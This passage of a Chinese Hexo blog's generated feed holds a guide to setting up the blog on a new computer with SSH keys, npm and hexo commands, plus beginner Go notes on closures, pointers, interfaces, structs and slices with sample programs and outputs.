        <content type="html"><![CDATA[<h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p>按照以下步骤将可以实现在其他电脑继续写博客</p><h2 id="1-必要软件"><a href="#1-必要软件" class="headerlink" title="1.必要软件"></a>1.必要软件</h2><ul><li>GIT客户端</li><li>node.js  </li></ul><h2 id="2-在GitHub添加新电脑秘钥"><a href="#2-在GitHub添加新电脑秘钥" class="headerlink" title="2.在GitHub添加新电脑秘钥"></a>2.在GitHub添加新电脑秘钥</h2><pre class=" language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"kalifun@163.com"</span>将id_rsa.pub复制到GitHub上<span class="token function">ssh</span> -T git@github.comHi kalifun<span class="token operator">!</span> You've successfully authenticated, but GitHub does not provide shell access.出现这个字样说明已经连接成功。</code></pre><h2 id="3-拷贝源文件"><a href="#3-拷贝源文件" class="headerlink" title="3.拷贝源文件"></a>3.拷贝源文件</h2><p><img src="/.io//source.png" alt="source"></p><ul><li>_config.yml</li><li>package.json</li><li>scaffolds/</li><li>source/</li><li>themes/</li></ul><h2 id="4-安装hexo"><a href="#4-安装hexo" class="headerlink" title="4.安装hexo"></a>4.安装hexo</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli -g</code></pre><h2 id="5-安装相关模块"><a href="#5-安装相关模块" class="headerlink" title="5.安装相关模块"></a>5.安装相关模块</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save</code></pre><h2 id="6-测试"><a href="#6-测试" class="headerlink" title="6.测试"></a>6.测试</h2><pre class=" language-bash"><code class="language-bash">hexo s访问127.0.0.1:4000和你之前博客一样说明成功了。</code></pre><h2 id="7-指令"><a href="#7-指令" class="headerlink" title="7.指令"></a>7.指令</h2><pre class=" language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo d</code></pre>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day4</title>
      <link href="/2018/09/16/golang-day4/"/>
      <url>/2018/09/16/golang-day4/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-Day4"><a href="#GoLang-Day4" class="headerlink" title="GoLang_Day4"></a>GoLang_Day4</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre><code>Go 语言中同时有函数和方法。一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。所有给定类型的方法属于该类型的方法集。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"math"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fun <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y <span class="token builtin">float64</span><span class="token punctuation">)</span> <span class="token builtin">float64</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> math<span class="token punctuation">.</span><span class="token function">Sqrt</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//25的平方根</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day4&gt;go run function.go5</code></pre><h2 id="函数闭包"><a href="#函数闭包" class="headerlink" title="函数闭包"></a>函数闭包</h2><pre><code>Go 函数可以是闭包的。闭包是一个函数值，它来自函数体的外部的变量引用。 函数可以对这个引用值进行访问和赋值；换句话说这个函数被“绑定”在这个变量上。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>    sum <span class="token operator">:=</span> <span class="token number">0</span>    <span class="token keyword">return</span> <span class="token keyword">func</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>        sum <span class="token operator">+=</span> x        <span class="token keyword">return</span> sum    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    pos<span class="token punctuation">,</span>neg <span class="token operator">:=</span> <span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">adder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>            <span class="token function">pos</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">neg</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day4&gt;go run function_closer.go0 01 -23 -66 -1210 -2015 -3021 -4228 -5636 -7245 -90</code></pre><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><pre><code>&lt;&lt;   左移n位就是乘以2的n次方     1 &lt;&lt;  10     ,结果为2的10次方：1024&gt;&gt;   右移n位就是除以2的n次方      1024 &gt;&gt; 10     结果为 1024/2的10次方=1^    异或   两个数个对应的二进制异或     124 ^ 2      1111100 ^ 0000010 = 1111110 结果为126</code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day5</title>
      <link href="/2018/09/16/golang-day5/"/>
      <url>/2018/09/16/golang-day5/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-Day5"><a href="#GoLang-Day5" class="headerlink" title="GoLang_Day5"></a>GoLang_Day5</h1><h2 id="1-字符串类型"><a href="#1-字符串类型" class="headerlink" title="1.字符串类型"></a>1.字符串类型</h2><pre><code>字符串表示很简单，就是由双引号（“ ”），“单”引号（` `）来描述。注意（` `）非（&#39; &#39;）唯一区别在于，双引号转义字符可以转义，单引号无法转义。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">"hello \n world"</span>    <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">`hello \n world`</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day5&gt;go run string.gohello world-------hello \n world</code></pre><h2 id="panic-amp-amp-recover"><a href="#panic-amp-amp-recover" class="headerlink" title="panic &amp;&amp; recover"></a>panic &amp;&amp; recover</h2><pre><code>panic &amp;&amp; recover是GO语言用来处理异常的关键词panic用来触发异常的，而recover是用来停止异常并返回传递给panic的值。注：recover不能异常处理，而recover只能在defer里面，否则无效。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"I am working"</span><span class="token punctuation">)</span>    <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"i will down?"</span><span class="token punctuation">)</span>    msg <span class="token operator">:=</span> <span class="token function">recover</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day5&gt;go run panic_recover.goI am workingpanic: i will down?goroutine 1 [running]:main.main()        D:/go_sty/day5/panic_recover.go:7 +0x80exit status 2</code></pre><h2 id="指针回顾"><a href="#指针回顾" class="headerlink" title="指针回顾"></a>指针回顾</h2><pre><code>&amp; 取一个变量的地址*   去一个指针变量所指向的地址值指针的一大用途就是可以将变量的指针作为实参传递给函数，从而在函数内部能够直接修改实参所指向的变量值。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span>  main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">change</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> x <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token function">change</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day5&gt;go run point.go100100</code></pre><pre><code>change函数改变的仅仅是内部变量x的值，而不会改变传递进去的实参。其实，也就是说Go的函数一般关心的是输出结果，而输入参数就相当于信使跑到函数门口大叫，你们这个参数是什么值，那个是什么值，然后就跑了。你函数根本就不能修改它的值。不过如果是传递的实参是指针变量，那么函数一看，小子这次你地址我都知道了，哪里跑。那么就是下面的例子：</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span>  main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">change</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> x <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token function">change</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>上面的例子中，change函数的虚参为整型指针变量，所以在main中调用的时候传递的是x的地址。然后在change里面使用*x=200修改了这个x的地址的值。所以x的值就变了。</code></pre><pre><code>D:\go_sty\day5&gt;go run point_1.go100200</code></pre><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><pre><code>new这个函数挺神奇，因为它的用处太多了。这里还可以通过new来初始化一个指针。上面说过指针指向(存储)的是一个变量的地址，但是指针本身也需要地址存储。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">set_value</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    x <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>    <span class="token function">set_value</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day5&gt;go run new.go0xc00004a0580xc000072018200</code></pre><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><pre><code>Go语言提供了一种接口功能，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口，不一定非要显式地声明要去实现哪些接口啦。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> Phone <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> NokiaPhone <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>nokiaphone NokiaPhone<span class="token punctuation">)</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"I am NokiaPhone"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">type</span> IPhone <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>iphone IPhone<span class="token punctuation">)</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"I am IPhone"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> phone Phone    phone  <span class="token operator">=</span>  <span class="token function">new</span><span class="token punctuation">(</span>NokiaPhone<span class="token punctuation">)</span>    phone<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    phone <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>IPhone<span class="token punctuation">)</span>    phone<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day5&gt;go run interface.goI am NokiaPhoneI am IPhone</code></pre><h2 id="并行计算"><a href="#并行计算" class="headerlink" title="并行计算"></a>并行计算</h2>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day2</title>
      <link href="/2018/09/12/golang-day2/"/>
      <url>/2018/09/12/golang-day2/</url>
      
        <content type="html"><![CDATA[<h1 id="Golang-Day2"><a href="#Golang-Day2" class="headerlink" title="Golang_Day2"></a>Golang_Day2</h1><h2 id="defer-栈"><a href="#defer-栈" class="headerlink" title="defer 栈"></a>defer 栈</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"FUN"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span> <span class="token punctuation">;</span>i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">defer</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day2&gt;go run defer_multi.goFUNdone9876543210</code></pre><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><pre><code>指针保存了变量的内存地址类型*T 是指向类型T的值得指针。其零值是“nil”</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    i<span class="token punctuation">,</span>j <span class="token operator">:=</span> <span class="token number">42</span><span class="token punctuation">,</span><span class="token number">27</span>    p <span class="token operator">:=</span> <span class="token operator">&amp;</span>i                 fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span>    <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">31</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token operator">&amp;</span>j    <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token operator">/</span><span class="token number">5</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day3</title>
      <link href="/2018/09/12/golang-day3/"/>
      <url>/2018/09/12/golang-day3/</url>
      
        <content type="html"><![CDATA[<h1 id="Golang-Day3"><a href="#Golang-Day3" class="headerlink" title="Golang_Day3"></a>Golang_Day3</h1><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><pre><code>一个结构体（`struct`）就是一个字段的集合。（而 type 的含义跟其字面意思相符。）</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test <span class="token keyword">struct</span> <span class="token punctuation">{</span>    x <span class="token builtin">int</span>    y <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>test<span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run struct.go{2 3}</code></pre><h2 id="结构体字段"><a href="#结构体字段" class="headerlink" title="结构体字段"></a>结构体字段</h2><pre><code>结构体字段利用点来访问</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test1 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    x <span class="token builtin">int</span>    y <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v <span class="token operator">:=</span> test1<span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>    v<span class="token punctuation">.</span>x <span class="token operator">=</span>  <span class="token number">10</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run struct_fields.go10</code></pre><h2 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h2><pre><code>结构体字段可以通过结构体指针来访问。通过指针间接访问是透明的。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test2 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    x <span class="token builtin">int</span>    y <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v <span class="token operator">:=</span> test2<span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>    p <span class="token operator">:=</span> <span class="token operator">&amp;</span>v    p<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">9</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run struct_pointers.go{9 3}</code></pre><h2 id="结构体文法"><a href="#结构体文法" class="headerlink" title="结构体文法"></a>结构体文法</h2><pre><code>结构体文法表示通过结构体字段的值作为列表来新分配一个结构体。使用 Name: 语法可以仅列出部分字段。（字段名的顺序无关。）特殊的前缀 &amp; 返回一个指向结构体的指针</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> test3 <span class="token keyword">struct</span> <span class="token punctuation">{</span>    x<span class="token punctuation">,</span>y <span class="token builtin">int</span><span class="token punctuation">}</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    v1 <span class="token operator">=</span> test3<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">}</span>    v2 <span class="token operator">=</span> test3<span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span>    v3 <span class="token operator">=</span> test3<span class="token punctuation">{</span>y<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">}</span>    p <span class="token operator">=</span> <span class="token operator">&amp;</span>test3<span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run struct_literals.go{1 2} {3 0} {0 4} &amp;{5 6}</code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre><code>类型[n]t,有n个类型为t的值数组。</code></pre><pre><code>var a [10]int定义变量a是有十个整数的数组数组的长度是其类型的一部分，因此数组不能改变大小。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">string</span>    a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello"</span>    a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"World"</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run array.goHello World[Hello World]</code></pre><h2 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h2><pre><code>一个 slice 会指向一个序列的值，并且包含了长度信息。[]T 是一个元素类型为 T 的 slice。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    p <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"p =="</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">;</span>i<span class="token operator">++</span>  <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"p[%d]==%d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>D:\go_sty\day3&gt;go run slice.gop == [2 3 4 5 6 7 8 9]p[0]==2p[1]==3p[2]==4p[3]==5p[4]==6p[5]==7p[6]==8p[7]==9</code></pre><h2 id="slice切片"><a href="#slice切片" class="headerlink" title="slice切片"></a>slice切片</h2><pre><code>silce 可以重新切片，创建一个新的slice值指向相同数组。s[1:5]表示从1到4（5-1）的slice元素，含两端。而s[1:1]则为空，s[1:1+1]则为新元素。</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    s <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">423</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"s=="</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"s[1:4]=="</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//省略下标表示从0开始</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"s[:5]=="</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//省略上标表示到len(s）结束</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"s[2:]"</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span><span class="token 